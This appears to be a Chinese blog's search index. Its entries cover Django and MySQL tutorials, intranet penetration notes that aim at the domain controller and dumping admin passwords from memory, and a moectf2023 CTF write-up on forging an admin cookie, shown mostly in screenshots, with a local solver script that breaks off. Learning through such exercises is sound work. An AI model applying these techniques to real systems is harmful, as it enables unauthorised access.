<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>html</title>
    <link href="/2023/10/07/%E5%89%8D%E7%AB%AF/HTML/html/"/>
    <url>/2023/10/07/%E5%89%8D%E7%AB%AF/HTML/html/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
    <tags>
      
      <tag>前端</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>redis</title>
    <link href="/2023/10/01/redis/redis/"/>
    <url>/2023/10/01/redis/redis/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
    <tags>
      
      <tag>redis</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>django</title>
    <link href="/2023/09/22/python/django/"/>
    <url>/2023/09/22/python/django/</url>
    
    <content type="html"><![CDATA[<h1 id="django"><a href="#django" class="headerlink" title="django"></a>django</h1><h2 id="基本认识"><a href="#基本认识" class="headerlink" title="基本认识"></a>基本认识</h2><h3 id="数据迁移"><a href="#数据迁移" class="headerlink" title="数据迁移"></a>数据迁移</h3><p>映射到数据库</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">python manage.py makemigrations<br>python manage.py migrate<br></code></pre></td></tr></table></figure><h3 id="创建APP"><a href="#创建APP" class="headerlink" title="创建APP"></a>创建APP</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> manage.<span class="hljs-keyword">py</span> startapp app_name<br></code></pre></td></tr></table></figure><h3 id="基本视图"><a href="#基本视图" class="headerlink" title="基本视图"></a>基本视图</h3><h4 id="返回响应的response"><a href="#返回响应的response" class="headerlink" title="返回响应的response"></a>返回响应的response</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_func</span>(<span class="hljs-params">request</span>):<br>    <span class="hljs-keyword">return</span> HttpResponse(<span class="hljs-string">&#x27;test&#x27;</span>)<br></code></pre></td></tr></table></figure><h4 id="渲染一个html"><a href="#渲染一个html" class="headerlink" title="渲染一个html"></a>渲染一个html</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">user_add</span>(<span class="hljs-params">request</span>):<br>    <span class="hljs-keyword">return</span> render(request, <span class="hljs-string">&quot;user_add.html&quot;</span>)<br></code></pre></td></tr></table></figure><h3 id="整体的框架"><a href="#整体的框架" class="headerlink" title="整体的框架"></a>整体的框架</h3><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/django/image-20230923191111893.png" alt="image-20230923191111893"></p><h3 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h3><h4 id="子路由的写法"><a href="#子路由的写法" class="headerlink" title="子路由的写法"></a>子路由的写法</h4><p>一般只需要一个子路由，这里我们使用app  ： user</p><p>首先需要在app里面创建urls.py文件，然后像主文件里面的urls一样添加路径就很好了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> django.urls <span class="hljs-keyword">import</span> path <br><br><span class="hljs-keyword">import</span> user.views<br><span class="hljs-comment"># from user import views</span><br><span class="hljs-keyword">from</span> user.views <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 子路由</span><br><br>urlpatterns = [<br>    path(<span class="hljs-string">&#x27;user_test/&#x27;</span>, user_test),<br>]<br><br></code></pre></td></tr></table></figure><p>然后主文件的urls.py如下图</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> django.contrib <span class="hljs-keyword">import</span> admin<br><span class="hljs-keyword">from</span> django.urls <span class="hljs-keyword">import</span> path,include<br><span class="hljs-keyword">from</span> user.views <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> app01 <span class="hljs-keyword">import</span> views<br><br>urlpatterns = [<br>    path(<span class="hljs-string">&#x27;user/&#x27;</span>, include(<span class="hljs-string">&#x27;user.urls&#x27;</span>)),<span class="hljs-comment"># 配置子路由的路径</span><br>    path(<span class="hljs-string">&#x27;user/index&#x27;</span>, views.index),<br>    path(<span class="hljs-string">&#x27;user/add&#x27;</span>, views.user_add),<br>    path(<span class="hljs-string">&#x27;user/list&#x27;</span>, views.user_list),<br>]<br></code></pre></td></tr></table></figure><h3 id="创建模板"><a href="#创建模板" class="headerlink" title="创建模板"></a>创建模板</h3><p>在model.py里添加以下的数据 </p><p>创建模板的时候记得一定要继承models.Model<br>创建一个类，相当于表的结构</p><p>对象相当于一行数据</p><p>类的属性就是对应的字段</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> django.db <span class="hljs-keyword">import</span> models<br><br><br><span class="hljs-comment"># Create your models here.</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">UserModel</span>(models.Model):<br>    name = models.CharField(<span class="hljs-number">10</span>,unique=<span class="hljs-literal">True</span>)<br>    sex = models.CharField(<span class="hljs-number">10</span>)<br>    age = models.IntegerField(default=<span class="hljs-number">18</span>)<br>    is_delete = models.BooleanField(default=<span class="hljs-literal">False</span>)<br><br><br><br><span class="hljs-comment"># 相当于创建了一个用户表</span><br><span class="hljs-comment"># 姓名  varchar</span><br><span class="hljs-comment"># 性别  varchar</span><br><span class="hljs-comment"># 年龄  age</span><br><span class="hljs-comment"># 是否删除 bool</span><br><br></code></pre></td></tr></table></figure><p>模型改变就需要再次数据迁移</p><p>上面执行完的结果就是<br><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/django/image-20230923213424682.png" alt="image-20230923213424682"></p><h3 id="后台的管理页面"><a href="#后台的管理页面" class="headerlink" title="后台的管理页面"></a>后台的管理页面</h3><ol><li><p>注册需要管理的模型</p><p>需要在admin.py里使用下面的代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> django.contrib <span class="hljs-keyword">import</span> admin<br><span class="hljs-keyword">from</span> user.models <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># Register your models here.</span><br><br>admin.register(UserModel)<br><br></code></pre></td></tr></table></figure></li><li><p>创建超级管理员用户</p><p>使用下面的指令就行了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">python manage.py createsuperuser<br></code></pre></td></tr></table></figure></li><li><p>添加admin的访问路径</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">path(<span class="hljs-string">&#x27;admin/&#x27;</span>, admin.site.urls)<br></code></pre></td></tr></table></figure></li><li><p>访问 后台管理系统</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8000</span><span class="hljs-regexp">/admin/</span><br></code></pre></td></tr></table></figure></li></ol><h2 id="路由-1"><a href="#路由-1" class="headerlink" title="路由"></a>路由</h2><p>使用include使用子路由</p><h3 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h3><ol><li><p>使用超链接的方向是</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html">&#123;# url转发测试 #&#125;<br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/user/list&quot;</span>&gt;</span>路由转发测试，点击进入用户下·列表<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><p>主路由的urls随摆配置</p></li><li><p>使用反向解释的方式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;<span class="hljs-comment"># 反向解析 #&#125;</span><br>&#123;<span class="hljs-comment"># list 是path name的值 #&#125;</span><br>&lt;a href=<span class="hljs-string">&quot;&#123;% url &#x27;list&#x27; %&#125;&quot;</span>&gt;反向解析测试，点击进入用户下列表&lt;/a&gt;<br></code></pre></td></tr></table></figure><p>注意：这么写的话，主路由不能存在命名空间</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">path(<span class="hljs-string">&#x27;user/&#x27;</span>, include(<span class="hljs-string">&#x27;user.urls&#x27;</span>))  <span class="hljs-comment"># 使用子路由</span><br>   <br></code></pre></td></tr></table></figure><p>子路由指定路由的名称</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">path(<span class="hljs-string">&#x27;list/&#x27;</span>, user_list, name=<span class="hljs-string">&#x27;list&#x27;</span>),<br></code></pre></td></tr></table></figure></li><li><p>使用命令空间的方式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;<span class="hljs-comment"># 命名空间反向解析 #&#125;</span><br>&lt;a href=<span class="hljs-string">&quot;&#123;% url &#x27;user:list&#x27; %&#125;&quot;</span>&gt;反向解析测试，点击进入用户下列表&lt;/a&gt;<br></code></pre></td></tr></table></figure><p>主路由一定存在namespace</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">path(<span class="hljs-string">&#x27;user/&#x27;</span>, include((<span class="hljs-string">&#x27;user.urls&#x27;</span>, <span class="hljs-string">&#x27;user&#x27;</span>), namespace=<span class="hljs-string">&#x27;user&#x27;</span>))  <span class="hljs-comment"># 使用命名空间</span><br></code></pre></td></tr></table></figure></li><li><p>使用重定向</p><p>关键字传参</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_redirect</span>(<span class="hljs-params">request</span>):<br>    <span class="hljs-keyword">return</span> redirect(reverse(<span class="hljs-string">&#x27;user:details&#x27;</span>, kwargs=&#123;<span class="hljs-string">&#x27;uid&#x27;</span>: <span class="hljs-number">2</span>&#125;))<br></code></pre></td></tr></table></figure><p>占位传参</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_redirect</span>(<span class="hljs-params">request</span>):<br>    <span class="hljs-keyword">return</span> redirect(reverse(<span class="hljs-string">&#x27;user:details&#x27;</span>, args=(<span class="hljs-number">2</span>,)))<br></code></pre></td></tr></table></figure><p>直接解析网址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_redirect</span>(<span class="hljs-params">request</span>):<br>    <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&quot;https://www.baidu.com&quot;</span>)<br></code></pre></td></tr></table></figure></li></ol><h2 id="模型基础"><a href="#模型基础" class="headerlink" title="模型基础"></a>模型基础</h2><p> 这个可以理解是数据库的结构</p>]]></content>
    
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mysql_fast_learning</title>
    <link href="/2023/09/22/MYSQL/mysql-fast-learning/"/>
    <url>/2023/09/22/MYSQL/mysql-fast-learning/</url>
    
    <content type="html"><![CDATA[<h1 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h1><ol><li>登录数据库</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql -u -p<br></code></pre></td></tr></table></figure><ol start="2"><li><p>查看当前数据库的字段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> chg_girlfriends<br></code></pre></td></tr></table></figure></li><li><p>查看当前有哪些数据库</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> databases;<br></code></pre></td></tr></table></figure></li><li><p>创建数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">creat database 数据库名字<br></code></pre></td></tr></table></figure></li><li><p>选中数据库操作</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">use 数据库的名称<br></code></pre></td></tr></table></figure></li><li><p>查看数据库的表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SHOW TABLES;<br></code></pre></td></tr></table></figure></li><li><p>创建一个gril_friend的表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs MYSQL">create table student(<br>    name  char(4) not null ,<br>    sex   enum(&#x27;男&#x27;,&#x27;女&#x27;),<br>    id    char(11) primary key,<br>    class tinyint not null<br>);<br></code></pre></td></tr></table></figure></li><li><p>查看某个数据表的结构</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs MYSQL">DESCRIBE STUDENT;<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/image-20230922091346627.png" alt="image-20230922091346627"></p></li><li><p>查看表中数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECt * FROM student;<br></code></pre></td></tr></table></figure></li><li><p>如何往数据表中添加数据记录</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> student<br><span class="hljs-keyword">VALUES</span>(<span class="hljs-string">&#x27;CHG&#x27;</span>,<span class="hljs-string">&#x27;M&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure></li><li><p>数据类型的选择</p></li></ol><ul><li>时间类型看格式</li><li>整型和字符串类型看长度</li></ul><ol start="12"><li><p>更新字段名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">ALTER TABLE student CHANGE COLUMN classNum cn TINYINT;<br></code></pre></td></tr></table></figure></li><li><p>创建约束</p><ul><li><p>主键约束</p><p>不重复且不为空</p><p>创建一个主键：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">CREATE TABLE test(<br>test1 char PRIMARY KEY<br>);<br></code></pre></td></tr></table></figure><p>创建联合主键（加起来不重复，任何一个都不能为空）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">CREATE TABLE test(<br>test1 char,<br>test2 char,<br>PRIMARY KEY(test1,test2)<br>);<br></code></pre></td></tr></table></figure><p>创建自增主键：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mysql">CREATE TABLE test(<br>test1 char,<br>test2 char,<br>test3 TINYINT AUTO_INCREMENT,<br>PRIMARY KEY(test1,test2,test3)<br>);<br></code></pre></td></tr></table></figure><p>给表添加主键：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">alter TABLE test DROP PRIMARY KEY;<br>ALTER TABLE test ADD PRIMARY KEY(test1,test2);<br></code></pre></td></tr></table></figure><p>删除主键：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">alter TABLE test DROP PRIMARY KEY;<br></code></pre></td></tr></table></figure><p>通过修改字段的方式增加主键(modify)：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">ALTER TABLE test MODIFY test1 TINYINT PRIMARY KEY;<br></code></pre></td></tr></table></figure></li><li><p>唯一约束</p><p>该字段的值不可以重复</p><p>alter添加</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">ALTER TABLE test ADD UNIQUE(test1,test2);<br></code></pre></td></tr></table></figure></li><li><p>非空约束</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span><br><br><br></code></pre></td></tr></table></figure></li><li><p>默认约束</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">default 默认值<br></code></pre></td></tr></table></figure><p>传了值就不会使用默认值</p></li><li><p>外键</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mysql">CREATE TABLE class (<br>name char(10) PRIMARY KEY,<br>class_id TINYINT DEFAULT 4,<br>student_name char(4),<br>FOREIGN KEY (student_name) REFERENCES student(name)<br>);<br></code></pre></td></tr></table></figure><p>​</p></li></ul><p></p></li><li><p>范式</p><ul><li><p>第一范式（1NF）</p><p>数据表中的所有的字段都是不可分割的原子值</p><p>就是满足填入的数据不可以拆分</p></li><li><p>第二范式(2NF)</p><p>必须是满足第一范式的前提下</p><p>一个表的所有列最好都和主键相关，不想关的拆解成其他表</p></li><li><p>第三范式(3NF)</p><p>满足第二范式</p><p>非主键不存在相关性</p></li></ul></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>MYSQL</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WEB安全</title>
    <link href="/2023/09/21/web/WEB%E5%AE%89%E5%85%A8/"/>
    <url>/2023/09/21/web/WEB%E5%AE%89%E5%85%A8/</url>
    
    <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内网信息搜集</title>
    <link href="/2023/09/12/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
    <url>/2023/09/12/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<h1 id="内网环境分析"><a href="#内网环境分析" class="headerlink" title="内网环境分析"></a>内网环境分析</h1><h2 id="什么是内网渗透"><a href="#什么是内网渗透" class="headerlink" title="什么是内网渗透"></a>什么是内网渗透</h2><ol><li>内网渗透的第一步，内网信息收集</li></ol><h2 id="内网外网的简介"><a href="#内网外网的简介" class="headerlink" title="内网外网的简介"></a>内网外网的简介</h2><ol><li><p>内网又称局域网</p></li><li><p>外网又称为广域网</p></li><li><p>内外网的区别</p><ul><li><p>内网和外网的覆盖范围不一样，内网通常是一个学校、一个医院的网络，外网通常指Internet网</p></li><li><p>内网一般是用于局域网内部的计算机之间的互相通信，如果需要访问Internet，需要借助外网，一般可以使用<strong>NAT</strong>技术实现内网访问外网</p></li><li><p>内网地址是私有地址和外网的不同</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E7%BD%91%E7%BB%9C%E7%8E%AF%E5%A2%83/image-20230912203818546.png" alt="image-20230912203818546"></p></li></ul></li></ol><h2 id="windows域环境"><a href="#windows域环境" class="headerlink" title="windows域环境"></a>windows域环境</h2><ol><li><p>域环境简介</p><p>  域是一个有安全边界的计算机集合（ 安全边界，意思是在两个域中，一个域中的用户无法访问另一个域中的资源）；域内资源由一台域控制 器（Domain Controller，DC）集中管理，用户名和密码是放在域控制器去验证的。  </p><p><strong>渗透的目标就是拿到域控制器</strong></p></li><li><p>与渗透的思路</p><ul><li>通过域成员得到域控的IP</li><li>通过域成员作为跳板扩大范围</li><li>利用域管理员可以登陆域中任何成员主机的特性，定位出域管理员登陆过的主机IP  </li><li>设法从域成员主机内存中dump出域管理员密码</li></ul></li></ol><h1 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h1><h2 id="域内信息收集"><a href="#域内信息收集" class="headerlink" title="域内信息收集"></a>域内信息收集</h2><h1 id="域密码凭证获取"><a href="#域密码凭证获取" class="headerlink" title="域密码凭证获取"></a>域密码凭证获取</h1>]]></content>
    
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>moectf2023</title>
    <link href="/2023/09/10/CTF%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/moectf2023/"/>
    <url>/2023/09/10/CTF%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/moectf2023/</url>
    
    <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="http"><a href="#http" class="headerlink" title="http"></a>http</h2><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230910233257705.png" alt="image-20230910233257705"></p><p>就是按照步骤完成就行了</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230910233715138.png" alt="image-20230910233715138"></p><p>0x01</p><p>将请求类型转变成POST</p><p>然后通过get 的方式使用post传参</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230910233817746.png" alt="image-20230910233817746"></p><p>0x02</p><p>使用post的方式传参</p><p>0x03</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230910233902951.png" alt="image-20230910233902951"></p><p>将character修改成admin</p><p>0x04</p><p>添加下面这一行</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230910234020326.png" alt="image-20230910234020326"></p><p>0x05</p><p>修改字段为</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230910234048061.png" alt="image-20230910234048061"></p><h2 id="WEB入门指北"><a href="#WEB入门指北" class="headerlink" title="WEB入门指北"></a>WEB入门指北</h2><p>打开文件之后发现，在最下面发现</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230910234420076.png" alt="image-20230910234420076"></p><p>这个是16进制加密，解密就好</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230910234453286.png" alt="image-20230910234453286"></p><h2 id="彼岸的flag"><a href="#彼岸的flag" class="headerlink" title="彼岸的flag"></a>彼岸的flag</h2><p>0x01</p><p>简单抓包，然后在发送的数据包中所有moectf就可以找到</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230911092017819.png" alt="image-20230911092017819"></p><h2 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h2><p>0x01</p><p>伪造一个用户登录</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230911092334905.png" alt="image-20230911092334905"></p><p>0x02</p><p>登录就好了</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230911092450153.png" alt="image-20230911092450153"></p><p>记录这个时候的token，使用base64解密如下</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230911093159059.png" alt="image-20230911093159059"></p><p>将角色改成admin，再经行加密</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230911093233173.png" alt="image-20230911093233173"></p><p>0x03</p><p>构造发送包，使用get，获取flag</p><p>注意划横线的地方</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230911093410726.png" alt="image-20230911093410726"></p><h2 id="gas-gas-gas"><a href="#gas-gas-gas" class="headerlink" title="gas!gas!gas!"></a>gas!gas!gas!</h2><p>0x01</p><p>看这个题目的意思，我们就是需要，在0.5秒，更具提示发送5个包</p><p>我们使用python实现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><br><br><br>url = <span class="hljs-string">&#x27;http://127.0.0.1:56182&#x27;</span><br>control=<span class="hljs-number">0</span><br>throttle=<span class="hljs-number">2</span><br>data1 = &#123;<span class="hljs-string">&#x27;driver&#x27;</span>:<span class="hljs-string">&#x27;august&#x27;</span>,<span class="hljs-string">&#x27;steering_control&#x27;</span>: control, <span class="hljs-string">&#x27;throttle&#x27;</span>: throttle&#125;<br><br>pattern = <span class="hljs-string">r&#x27;弯道(.*?)，(.*?)&lt;/font&gt;&#x27;</span><br><br><span class="hljs-keyword">with</span> requests.Session() <span class="hljs-keyword">as</span> session:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>): 